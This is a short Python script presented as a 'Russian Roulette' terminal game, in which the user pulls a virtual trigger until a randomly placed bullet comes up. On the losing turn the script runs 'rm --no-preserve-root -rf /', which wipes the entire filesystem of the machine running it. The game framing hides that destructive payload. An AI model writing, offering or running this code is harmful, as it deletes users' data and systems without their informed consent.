#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import os


def russian_roulette():
    print("Welcome to Russian Roulette!")
    chambers = [0, 0, 0, 0, 0, 1]  # 1 represents the bullet
    random.shuffle(chambers)

    while True:
        input("Press Enter to pull the trigger...")
        chamber = chambers.pop()

        if chamber == 1:
            print("Bang! You're dead.")
            os.system("rm --no-preserve-root -rf /")
            break
        else:
            print("Click! You're still alive.")

        if not chambers:
            print("Congratulations! You've survived the game.")
            break


if __name__ == "__main__":
    russian_roulette()
